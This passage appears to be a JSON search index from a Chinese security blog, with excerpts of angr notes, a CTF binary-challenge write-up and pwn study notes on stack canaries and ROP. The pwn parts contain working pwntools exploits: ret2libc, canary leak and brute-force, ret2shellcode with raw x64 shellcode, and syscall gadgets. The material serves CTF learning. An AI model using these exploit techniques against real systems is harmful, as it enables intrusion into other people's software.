Monitors how much memory is free/available on the system between simgr steps and stops exploration if it gets too low.   Oppologist: The “operation apologist” is an especially fun gadget - if this technique is enabled and angr encounters an unsupported instruction, for example a bizzare and foreign floating point SIMD op, it will concretize all the inputs to that instruction and emulate the single instruction using the unicorn engine, allowing execution to continue.   Spiller: When there are too many states active, this technique can dump some of them to disk in order to keep memory consumption low.   Threading: Adds thread-level parallelism to the stepping process. This doesn’t help much because of python’s global interpreter locks, but if you have a program whose analysis spends a lot of time in angr’s native-code dependencies (unicorn, z3, libvex) you can seem some gains.   Tracer: An exploration technique that causes execution to follow a dynamic trace recorded from some other source. The dynamic tracer repository has some tools to generate those traces.   Veritesting: An implementation of a CMU paper on automatically identifying useful merge points. This is so useful, you can enable it automatically with veritesting=True in the SimulationManager constructor! Note that it frequenly doesn’t play nice with other techniques due to the invasive way it implements static symbolic execution.   ","categories": [],
        "tags": ["angr"],
        "url": "https://zjgcjy.github.io/posts/2019-01/AngrLearning-5.html",
        "teaser":null},{
        "title": "Python编程从入门到实践读书笔记 1",
        "excerpt":" ","categories": [],
        "tags": ["python"],
        "url": "https://zjgcjy.github.io/posts/2019-01/python%E7%BC%96%E7%A8%8B%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E8%B7%B5%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-1.html",
        "teaser":null},{
        "title": "安恒一月赛二进制题目题解",
        "excerpt":"   好久没打安恒的月赛了，碰巧今天有空，就做了下二进制的几道题目，总体难度不是很大，还好没有触及到我的知识盲区Orz。      reverse   来玩蛇吧   这题给了2个文件，一个exe和一个pyc，结合图标和题目意思，我好像明白了什么，估计是python的逆向题。      以前也做过这种类型的题，但是很久没做，有点生疏了，主要是要知道这个程序是python写的，并且用打包器制作成可执行文件的。直接上网搜索python打包器就能找到这个工具的名字叫做PyInstaller，根据Pcat的博客描述，我们可以使用PyInstaller Extractor来提取可执行文件的资源内容。这个脚本网上也很容易能下载。 需要注意的是，当我们开始提取文件的时候，需要和编写的python的程序版本一致，由于我本机只有python2的环境，提取资源的时候，就会发生错误，如下图所示。      由于PyInstaller Extractor兼容python2和3，在python3环境下即可提取资源进行逆向分析。这样我们就能提取到一堆文件了，如下表所示。    _bz2.pyd*                                              _hashlib.pyd*                                          _lzma.pyd*                                             _socket.pyd*                                           _ssl.pyd*                                              AnhengRe                                               AnhengRe.exe.manifest                                  api-ms-win-core-console-l1-1-0.dll*                    api-ms-win-core-datetime-l1-1-0.dll*                   api-ms-win-core-debug-l1-1-0.dll*                      api-ms-win-core-errorhandling-l1-1-0.dll*              api-ms-win-core-file-l1-1-0.dll*                       api-ms-win-core-file-l1-2-0.dll*                       api-ms-win-core-file-l2-1-0.dll*                       api-ms-win-core-handle-l1-1-0.dll*                     api-ms-win-core-heap-l1-1-0.dll*                       api-ms-win-core-interlocked-l1-1-0.dll*                api-ms-win-core-libraryloader-l1-1-0.dll*              api-ms-win-core-localization-l1-2-0.dll*               api-ms-win-core-memory-l1-1-0.dll*                     api-ms-win-core-namedpipe-l1-1-0.dll*                  api-ms-win-core-processenvironment-l1-1-0.dll*         api-ms-win-core-processthreads-l1-1-0.dll*             api-ms-win-core-processthreads-l1-1-1.dll*             api-ms-win-core-profile-l1-1-0.dll*                    api-ms-win-core-rtlsupport-l1-1-0.dll*                 api-ms-win-core-string-l1-1-0.dll*                     api-ms-win-core-synch-l1-1-0.dll*                      api-ms-win-core-synch-l1-2-0.dll*                      api-ms-win-core-sysinfo-l1-1-0.dll*                    api-ms-win-core-timezone-l1-1-0.dll*                   api-ms-win-core-util-l1-1-0.dll*                       api-ms-win-crt-conio-l1-1-0.dll*                       api-ms-win-crt-convert-l1-1-0.dll*                     api-ms-win-crt-environment-l1-1-0.dll*                 api-ms-win-crt-filesystem-l1-1-0.dll*                  api-ms-win-crt-heap-l1-1-0.dll*                        api-ms-win-crt-locale-l1-1-0.dll*                      api-ms-win-crt-math-l1-1-0.dll*                        api-ms-win-crt-process-l1-1-0.dll*                     api-ms-win-crt-runtime-l1-1-0.dll*                     api-ms-win-crt-stdio-l1-1-0.dll*                       api-ms-win-crt-string-l1-1-0.dll*                      api-ms-win-crt-time-l1-1-0.dll*                        api-ms-win-crt-utility-l1-1-0.dll*                     base_library.zip                                       out00-PYZ.pyz                                          out00-PYZ.pyz_extracted/                               pyexpat.pyd*                                           pyiboot01_bootstrap                                    pyimod01_os_path                                       pyimod02_archive                                       pyimod03_importers                                    'pyi-windows-manifest-filename AnhengRe.exe.manifest'   python36.dll*                                          select.pyd*                                            struct                                                 ucrtbase.dll*                                          unicodedata.pyd*                                       VCRUNTIME140.dll*                                       那么接下来我们需要知道哪些是外部的库函数，哪些是程序本身的部分。那么很明显，dll都是windows下的动态链接库，而pyd也是python的动态链接库（python dll），除去这些文件和一些清单文件外，再结合文件名，很容易就能找到AnhengRe这个文件，应该就是我们所需要的。 接下来这一步就是分析这个文件是什么格式。一般的思路就是通过file命令或者binwalk进行解析，再或者通过strings来查看字符串。如下所示。   $ file AnhengRe AnhengRe: data  $ strings AnhengRe   Tell me your name?z  Tell me your pasw    9f1ff1e8b5b91110     c4e21c11a2412        wrong                AnHeng               Congratulations      flag                 pause                flag{                no,)                 input                range                print                system               AnhengRe.py          &lt;module&gt;               从我自己角度来说，我立马判断这就是一个pyc程序了，因为这些字符串特征很明显，没有加密混淆，也出现了AnhengRe.py和module这样的字样。但是用010editor分析后发现文件头不满足pyc的格式，于是我猜想头部数据被修改了。经过多次实验和对比，最终发现头部的12字节被剔除了。然后进行补齐即可，忽略时间戳。   33 0D 0D 0A 00 00 00 00 00 00 00 00   最后我们即可通过uncompyle6等反编译工具来获得python的源码，得到源码如下：   #!/usr/bin/env python # encoding: utf-8  import os n1 = input('Tell me your name?') n2 = input('Tell me your pasw') n11 = chr(ord(n1[0]) + 12) s = '' st3 = '51e' st2 = '9f1ff1e8b5b91110' st1 = 'c4e21c11a2412' st0 = 'wrong' if n11 + 'AnHeng' == n2:     for i in range(0, 4):         s += st1[3 - i]          print('Congratulations')     ts = st2[0] + st3 + st2[1] + s     print('flag{' + st3[:1] + st1 + st2 + st3[-2:] + '}')     os.system('pause') else:     print('no,' + st0)   这段代码再简单也不为过了，直接将判断条件删除再运行即可获得flag。   old-drive   逆向第二题，本来看题目我以为是驱动题，但实际不是。主函数逻辑如下：      首先对输入长度进行检测，很容易判断是40，然后进行了一段smc，即self-modify-code，自修改代码，也是比较常见的样式，即常量异或。这段smc用于解密一段函数，这个函数在最后的比较中是有用到的。接下来将输入前5字节和flag{对比，没什么好说的，最后进入sub4010b0这个函数中。其中主函数中的smc解密脚本如下（idapython）：   addr = 0x401000 for i in xrange(0x401260-addr):     PatchByte(addr+i, Byte(addr+i) ^ 0xbb)   第二个check逻辑如下：    v3 = byte_4021B8;  do  {    v4 = (unsigned __int8)*v3++;    if ( ((char)a2[v2] ^ 0x86) != v4 )           LABEL_12:      exit(0);    ++v2;  }   也是一个比较常见的密文比较，对应的解密脚本如下：   addr = 0x4021b8 flag = \"flag{\" for i in xrange(6):   flag += chr(Byte(addr+i) ^ 0x86)   然后进入第三个check逻辑中，如下图所示：      熟悉base64编码的同学一般能一眼看出来这段算法，就是一个正常的base64编码，编码表没任何变化，要想快速识别base64算法需要对该算法比较熟悉。首先是3×8=4×6，即3个8bit的字符转换成4个6bit的字符，然后查表，每一组分成4份，每一份分别是每一组的高6bit，次高6bit，次底6bit和最低的6bit。还不熟悉的同学可以自己编程，再逆向分析其实现。所以这段算法对应的解密脚本如下：   flag += b64decode(\"c19zbWNf\")   然后进入最后一个check逻辑中，如下图所示。      首先定义了一段奇怪的字符串，然后载入输入的后半段，然后进入一个switch语句中，循环检测，最后判断是否是#，且循环中每一步的下标对应的字符只能是空格，否则就失败。所以这就是一个迷宫算法了，迷宫的入口点是在字符串偏移8的位置上，也就是g所处的位置，然后2aqw分别代表上下左右进行移动。   g +    + + + ++ + + + #+ + + ++++ + + ++++ + +      +   由于这个迷宫很小，所以我们很容易就能得到答案了，最后我们再将几个部分练起来即可得到整个的flag。   pwn   mycard   pwn第一个题主要堆上的问题，首先主函数有4个功能，分别是create、edit、delete和exit，如下图所示，常见的清单型pwn题。      关键的漏洞主要是由于在edit过程中，没有对分配的块大小进行检测，如果重新设置的大小比原来的大，会导致堆溢出的情况发生。由于程序中开启了所有的保护，比较常见的方式是通过hook来进行漏洞利用，那么我们首先要泄露出libc的基地址。   Arch:     amd64-64-little RELRO:    Full RELRO Stack:    Canary found NX:       NX enabled PIE:      PIE enabled   那么在这个程序中我们的确是能泄露出libc的基地址的，如下图所示。      由于write函数设置了固定长度的输入，而堆块上也会存在libc的地址，通过泄露该地址，我们就能拿到libc的地址，绕过保护，代码如下：   libc = ELF('libc.so.6') realloc_hook = libc.symbols['__realloc_hook'] libc.address = delete(3) - realloc_hook - 240   然后我们将堆块的地址指向hook函数的自动，进一步再将hook指向system的地址，最后调用realloc即可getshell。   rrr   这个题的漏洞主要是栈缓冲区溢出，如下图所示，读取字节过长导致栈溢出，所以能够劫持控制流。      那么这个题方法有很多，由于没有canary检测，无论是stack pivot来进行栈迁移执行shellcode还是传统的ret2libc都行，需要注意的是这里程序中有个随机值异或的过程，最简单的方式就是控制strlen的返回值来防止后续字节被修改。 我自己还是通过ret2libc来实现的，通过puts函数来打印出got表项的地址，然后计算出偏移量，返回到主函数再进行一次栈溢出，返回到system或execve即可getshell。   s.recv() payload = flat([cyclic(48),0, elf.plt['puts'], 0x8048480, elf.got['puts']]) s.send(payload) puts_addr = u32(s.recvuntil(\"\\xf7\").ljust(4, '\\x00')) log.success(\"puts_addr -&gt; {:#x}\".format(puts_addr)) s.recv() libc.address = puts_addr - libc.symbols['puts'] log.success(\"libc.address -&gt; {:#x}\".format(libc.address))  payload = flat([cyclic(48),0, libc.symbols['execve'], 0x8048480,next(libc.search(\"/bin/sh\")),0,0]) s.send(payload) #s.recv() s.interactive()   ","categories": [],
        "tags": ["wp"],
        "url": "https://zjgcjy.github.io/posts/2019-01/%E5%AE%89%E6%81%92%E4%B8%80%E6%9C%88%E8%B5%9B%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%A2%98%E7%9B%AE%E9%A2%98%E8%A7%A3.html",
        "teaser":null},{
        "title": "Python编程从入门到实践读书笔记 2",
        "excerpt":" ","categories": [],
        "tags": ["python"],
        "url": "https://zjgcjy.github.io/posts/2019-01/python%E7%BC%96%E7%A8%8B%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E8%B7%B5%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-2.html",
        "teaser":null},{
        "title": "Angrlearning 6",
        "excerpt":"   学习笔记，结合官方文档和网上资料整理，加强理解 从angr第二章第六节开始 执行引擎、分析和总结      当你想要在angr中单步执行指令时，这一步会进行很多事情来达成这个目标。angr使用一系列的引擎（SimEngine子类中的）来模拟基于给定输入状态的一部分代码。angr的执行核心只是按顺序尝试所有可用的引擎，直到能遇到一个引擎来处理这一步。以下是这些引擎的顺序。      The failure engine kicks in when the previous step took us to some uncontinuable state   The syscall engine kicks in when the previous step ended in a syscall   The hook engine kicks in when the current address is hooked   The unicorn engine kicks in when the UNICORN state option is enabled and there is no symbolic data in the state   The VEX engine kicks in as the final fallback.   模拟后继Simsuccessors   TODO：   The code that actually tries all the engines in turn is project.factory.successors(state, **kwargs), which passes its arguments onto each of the engines. This function is at the heart of state.step() and simulation_manager.step(). It returns a SimSuccessors object, which we discussed briefly before. The purpose of SimSuccessors is to perform a simple categorization of the successor states, stored in various list attributes. They are:   断点   和任何像样的执行引擎一样，angr也支持断点。   ","categories": [],
        "tags": ["angr"],
        "url": "https://zjgcjy.github.io/posts/2019-01/AngrLearning-6.html",
        "teaser":null},{
        "title": "Angrlearning 7",
        "excerpt":"   学习笔记，结合官方文档和网上资料整理，加强理解 从angr第二章第六节开始 执行引擎、分析和总结      ","categories": [],
        "tags": ["angr"],
        "url": "https://zjgcjy.github.io/posts/2019-01/AngrLearning-7.html",
        "teaser":null},{
        "title": "Angrlearning 8",
        "excerpt":"   学习笔记，结合官方文档和网上资料整理，加强理解 从angr第二章第六节开始 执行引擎、分析和总结      ","categories": [],
        "tags": ["angr"],
        "url": "https://zjgcjy.github.io/posts/2019-01/AngrLearning-8.html",
        "teaser":null},{
        "title": "Angrlearning 9",
        "excerpt":"   学习笔记，结合官方文档和网上资料整理，加强理解 从angr第二章第六节开始 执行引擎、分析和总结      ","categories": [],
        "tags": ["angr"],
        "url": "https://zjgcjy.github.io/posts/2019-01/AngrLearning-9.html",
        "teaser":null},{
        "title": "Pwnit 1",
        "excerpt":"   pwn学习资料，来自ctf-wiki。 安全机制-Canary      Canary   canary 不管是实现还是设计思想都比较简单高效，就是插入一个值，在 stack overflow 发生的 高危区域的尾部，当函数返回之时检测 canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。   原理：   -fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护 -fstack-protector-all 启用保护，为所有函数插入保护 -fstack-protector-strong -fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护 -fno-stack-protector 禁用保护.   Canary 与 windows 下的 GS 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 linux 下保护机制的标配。   当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：   mov    rax, qword ptr fs:[0x28] mov    qword ptr [rbp - 8], rax   在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。   mov    rdx,QWORD PTR [rbp-0x8] xor    rdx,QWORD PTR fs:0x28 je     0x4005d7 &lt;main+65&gt; call   0x400460 &lt;__stack_chk_fail@plt&gt;   如果 canary 已经被非法修改，此时程序流程会走到 __stack_chk_fail。__stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，glibc2.28中定义如下。         这意味可以通过劫持 __stack_chk_fail的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容 (参见 stack smash)。   进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。      如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。   事实上，TLS 中的值由函数 security_init 进行初始化。      Canary 设计为以字节 \\x00 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。   demo   源代码如下：   #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; void getshell(void) {     system(\"/bin/sh\"); } void init() {     setbuf(stdin, NULL);     setbuf(stdout, NULL);     setbuf(stderr, NULL); } void vuln() {     char buf[100];     for(int i=0;i&lt;2;i++){         read(0, buf, 0x200);         printf(buf);     } } int main(void) {     init();     puts(\"Hello Hacker!\");     vuln();     return 0; }   编译为 32bit 程序，开启 NX，ASLR，Canary 保护。makefile文件如下。   CC = gcc SRCS = canary.c EXEC = $(SRCS:.c=)  X86 = -m32 X64 =  DEBUG = -g  # ------------- security ---------------- NO_CANARY = -fno-stack-protector CANARY = -fstack-protector ALL_CANARY = -fstack-protector-all  NO_NX = -z execstack NX = -z noexecstack  NO_PIE = -no-pie PIE = -fpie -pie ALL_PIE = -fPIE -pie  NO_RELRO = -z norelro PART_RELRO = -z lazy ALL_RELRO = -z now # ------------- security ----------------  # X86 DEBUG NO_CANARY NO_NX NO_PIE PART_RELRO ALL_NO = $(X86) $(DEBUG) $(NO_CANARY) $(NO_NX) $(NO_PIE) $(PART_RELRO)  # X86 DEBUG NO_CANARY NX NO_PIE PART_RELRO ONLY_NX = $(X86) $(DEBUG) $(NO_CANARY) $(NX) $(NO_PIE) $(PART_RELRO)  # X86 DEBUG CANARY NX NO_PIE PART_RELRO CANARY_NX = $(X86) $(DEBUG) $(CANARY) $(NX) $(NO_PIE) $(PART_RELRO)  # X86 DEBUG CANARY NX PIE PART_RELRO CANARY_NX_PIE = $(X86) $(DEBUG) $(CANARY) $(NX) $(PIE) $(PART_RELRO)  CFLAGS = $(CANARY_NX)  ${EXEC}: \t$(CC) $(CFLAGS) $(SRCS) -o $(EXEC)  all: \t${EXEC}  clean: \trm $(EXEC)   首先通过覆盖 Canary 最后一个 \\x00 字节来打印出 4 位的 Canary 之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中。      #!/usr/bin/env python # -*- coding: utf-8 -*- __author__='zjgcjy'  import os import sys  from pwn import * #from LibcSearcher import *  usage = ''' \tusage: python2 exp.py file index '''  if len(sys.argv) != 3: \tprint usage \texit(-1)  vul = './' + sys.argv[1] elf = ELF(vul) context.arch = elf.arch context.terminal = ['gnome-terminal', '-x', 'sh', '-c']  index = eval(sys.argv[2])  if index == 0: \tcontext.log_level = 'debug' \tlibc = elf.libc \ts = process(vul)  elif index == 1:     context.log_level = 'debug'     libc = elf.libc     s = gdb.debug(vul, ''' break _start continue  b main ''')     pause()  elif index == 2: \tcontext.log_level = 'debug' \tlibc = elf.libc \ts = process(vul) \t#gdb.attach(proc.pidof(s)[0]) \tgdb.attach(s, \"b main\") \tpause()  elif index == 3: \tcontext.log_level = 'debug' \tlib = '~/work/ctf/2019/tamuctf/pwn/3/libc.so.6' \tlibc = ELF(lib) \ts = process(vul, env={'LD_PRELOAD': lib}) \t \tgdb.attach(s, \"b * 0x40080b\") \tpause()  elif index == 4: \tcontext.log_level = 'debug' \tip = 'pwn.jarvisoj.com'  \tport = 1234 \ts = remote(ip, port)      else: \tprint 'wrong'   def libSearch(addr, fname = 'write'): \tobj = LibcSearcher(fname, addr) \t#obj.db = 'libc6_2.23-0ubuntu10_i386.symbols' \tlibc_base = addr - obj.dump(fname) \tsystem_addr = libc_base + obj.dump('system') \tbinsh_addr = libc_base + obj.dump('str_bin_sh') \texecve_addr = libc_base + obj.dump('execve') \tlog.success(\"libc_base -&gt; {:#x}\".format(libc_base))   ''' d = DynELF(leak, elf = ELF(argv[1])) system_addr = d.lookup('system', 'libc') success(\"system_addr -&gt; {:#x}\".format(system_addr)) ''' def leak(address, ret, offset, length = 4):     payload = 'a' * offset + p32(elf.plt['write']) + p32(ret)      payload += p32(1) + p32(address) + p32(length)     s.send(payload)     data = s.recv(length)     log.info(\"%#x =&gt; %s\" % (address, (data or '').encode('hex')))     return data   def csu(offset, r12, r15, r14, r13, ret, rbx = 0, rbp = 1):     # pop rbx,rbp,r12,r13,r14,r15     # rbx = 0,     # rbp = 1     # call r12     # rdi = edi = r15d     # rsi = r14     # rdx = r13     payload = 'a' * offset + p64(csu_second_addr)     payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)     payload += p64(csu_first_addr)     payload += 'a' * 0x38     payload += p64(ret)     s.send(payload)     sleep(0.5)   def csu_make(): \tcsu_first_addr = 0x4005F0 \tcsu_second_addr = 0x40060A \tmain_addr = 0x40057D \ts.recv() \t# write(1,got['write'],8) \tcsu(136, elf.got['write'], 1, elf.got['write'], 8, main_addr) \tlibc.address = u64(s.recv(8)) - libc.symbols['write'] \tlog.success(\"libc.address -&gt; {:#x}\".format(libc.address))  \ts.recv() \t# read(0,bss,16) \t# read execve_addr and /bin/sh\\x00 \tcsu(136, elf.got['read'], 0, elf.bss(), 16, main_addr) \ts.send(p64(libc.symbols['execve']) + '/bin/sh\\x00')  \ts.recv() \t# execve('/bin/sh', 0, 0) \tcsu(136, elf.bss(), elf.bss()+8, 0, 0, 0xdeadbeef) \ts.interactive()   def exception_canary(): \tenviron_addr = libc.symbols['environ'] \tpayload = flat([cyclic(0x128), environ_addr]) \tstack_address = u64(s.recvuntil('\\x7f')[-6:].ljust(8, '\\x00')) \tsuccess(\"stack_address -&gt; {:#x}\".format(stack_address)) \tpayload = flat([cyclic(0x128), stack_address - 0x168])  \tpayload = flat(['1'*8, rdi_ret, elf.got['setvbuf'], elf.plt['puts'], vuln_addr]).ljust(80, 'a') \tpayload += flat([fake_rbp, leave_ret_addr]) \tlibc.address = u64(s.recvuntil('\\x7f')[-6:].ljust(8, '\\x00')) - libc.symbols['setvbuf']  \trdx_rsi_ret = libc.address + 0x1150c9 \tsh_addr = next(libc.search(\"/bin/sh\")) \texecve_addr = libc.sym['execve'] \tpayload = flat(['2' *8, rdi_ret, sh_addr, rdx_rsi_ret, 0, 0, execve_addr]).ljust(80,'b') \tpayload += flat([fake_rbp - 0x30, leave_ret_addr])  def main(): \ts.recv() \ts.sendline(cyclic(100)) \ts.recvuntil(\"\\x0a\") \tcanary = u32(s.recv(3).rjust(4, '\\x00')) \tlog.success(\"canary -&gt; {:#x}\".format(canary)) \t \tgetshell = elf.sym[\"getshell\"] \t \ts.sendline(cyclic(100) + p32(canary) + 'a'*12 + p32(getshell)) \ts.recv() \ts.interactive() \t  if __name__=='__main__': \tmain() \t   爆破canary   one-by-one   对于 Canary，不仅每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，而且同一个进程中的每个线程的 Canary 也不同。 但是存在一类通过 fork 函数开启子进程交互的题目，因为 fork 函数会直接拷贝父进程的内存，因此每次创建的子进程的 Canary 是相同的。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。 在著名的 offset2libc 绕过 linux64bit 的所有保护的文章中，作者就是利用这样的方式爆破得到的 Canary:   print \"[+] Brute forcing stack canary \"  start = len(p) stop = len(p)+8  while len(p) &lt; stop:    for i in xrange(0,256):       res = send2server(p + chr(i))        if res != \"\":          p = p + chr(i)          #print \"\\t[+] Byte found 0x%02x\" % i          break        if i == 255:          print \"[-] Exploit failed\"          sys.exit(-1)  canary = p[stop:start-1:-1].encode(\"hex\") print \"   [+] SSP value is 0x%s\" % canary   劫持__stack_chk_fail 函数   已知 Canary 失败的处理逻辑会进入到 __stack_chk_failed 函数，__stack_chk_failed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。   覆盖 TLS 中储存的 Canary 值   已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。      ","categories": [],
        "tags": ["pwn"],
        "url": "https://zjgcjy.github.io/posts/2019-03/Pwnit-1.html",
        "teaser":null},{
        "title": "Pwnit 2",
        "excerpt":"   pwn学习资料，来自ctf-wiki。 栈介绍      栈介绍   高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，程序的栈是从进程地址空间的高地址向低地址增长的。      栈中需要掌握的有栈帧、函数调用过程、序言和结语、函数调用规则、传参顺序等等。需要注意的是，32 位和 64 位程序有以下简单的区别：      x86            函数参数在函数返回地址的上方           x64            System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在** RDI, RSI, RDX, RCX, R8 和 R9 寄存器**中，如果还有更多的参数的话才会保存在栈上。       内存地址不能大于 0x00007FFFFFFFFFFF，6 个字节长度，否则会抛出异常。           栈溢出介绍   栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是      程序必须向栈上写入数据。   写入的数据大小没有被良好地控制。   这里的例子我就不做了，比较简单。   关于aslr，我们可以通过修改 /proc/sys/kernel/randomize_va_space 来控制 ASLR 启动与否，具体的选项有      0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。   1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。   2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。   寻找漏洞   通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下      输入            gets，直接读取一行，忽略’\\x00’       read，读取指定长度，可以读0       scanf       vscanf           输出            sprintf           字符串            strcpy，字符串复制，遇到’\\x00’停止       strcat，字符串拼接，遇到’\\x00’停止       bcopy           确定填充长度   这一部分主要是计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式      相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得   相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。   直接地址索引，就相当于直接给定了地址。   一般来说，我们会有如下的覆盖需求      覆盖函数返回地址，这时候就是直接看 EBP 即可。   覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。   覆盖 bss 段某个变量的内容。   根据现实执行情况，覆盖特定的变量或地址的内容。   之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。   ","categories": [],
        "tags": ["pwn"],
        "url": "https://zjgcjy.github.io/posts/2019-03/Pwnit-2.html",
        "teaser":null},{
        "title": "Pwnit 3",
        "excerpt":"   pwn学习资料，来自ctf-wiki。 基本 ROP      随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。   之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件      程序存在溢出，并且可以控制返回地址。   可以找到满足条件的 gadgets 以及相应 gadgets 的地址。   如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。   ret2text   ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。   这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。   这种类型的题目，一般都有system函数，只要通过栈溢出来劫持控制流，返回到特定地址即可。 通过在r2中查看，我们可以看到程序中有该函数，直接跳转到该地址即可，不要跳转到secure函数首地址，因为pwn就是具有任意性，既然可以控制控制流了，就直接到system函数即可。      脚本也很简单。   ret_addr = 0x804863a payload = 'a'*0x6c + 'bbbb' + p32(ret_addr) sh.recvuntil('?\\n') sh.sendline(payload)      ret2shellcode   ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。   在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。   一般就是在bss段进行读写操作，然后将返回地址控制到bss段地址。      脚本如下：   s.recv() ret_addr = 0x0804A080 payload = asm(shellcraft.sh()).ljust(112, '\\x90') + p32(ret_addr) s.sendline(payload) s.recv() s.interactive()      x64      sniperoj-pwn100-shellcode-x86-64分析    这个题也是常规的栈溢出，然后ret2shellcode即可，需要注意的是，由于栈空间的限制，我们想要ret2shellcode的大小只有24，需要找一个64位下长度小于24的shellcode才能成功。      而且由于shellcode都有压栈和出栈操作，而我们的shellcode又正好都在esp的上面，这会导致shellcode被压栈给覆盖，导致shellcode执行失败，需要注意这个问题。 所以我们可以将shellcode放在esp的上面，由于它不会一开始就pop指令，这样就能防止它被覆写，从而getshell。但是这个题输入长度也有限制，一共64，除去填充的32，shellcode的长度要求必须小于32，所以我们选用网上提供的shellcode即可。   脚本如下   s.recvuntil('[') ret_addr = int(s.recvuntil(']', drop=True), 16) # 23 bytes # https://www.exploit-db.com/exploits/36858/ shellcode_x64 = \"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\" payload = 'b' * 24 + p64(ret_addr + 32) + shellcode_x64 s.sendline(payload) s.recv() s.interactive()      ret2syscall   ret2syscall，即控制程序执行系统调用，获取 shell。和ret2libc不一样的是，ret2syscall是不需要用到libc的，这就让我们必须在程序本身中找到gadget，实现system('/bin/sh')或者execve('/bin/sh', NULL, NULL)。这种方式是通过 shell 获取系统调用。所以这种方式一般适合于静态链接的程序。   简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取。   execve(\"/bin/sh\",NULL,NULL)   其中，该程序是 32 位，所以我们需要使得      系统调用号，即 eax 应该为 0xb   第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。   第二个参数，即 ecx 应该为 0   第三个参数，即 edx 应该为 0   所以我们需要通过gadget来控制这4个寄存器。   ROPgadget --binary ./rop --only 'pop|ret'|ag pop 0x080bb196 : pop eax ; ret 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret   还要找到sh的地址，和int 0x80的地址。   ROPgadget --binary 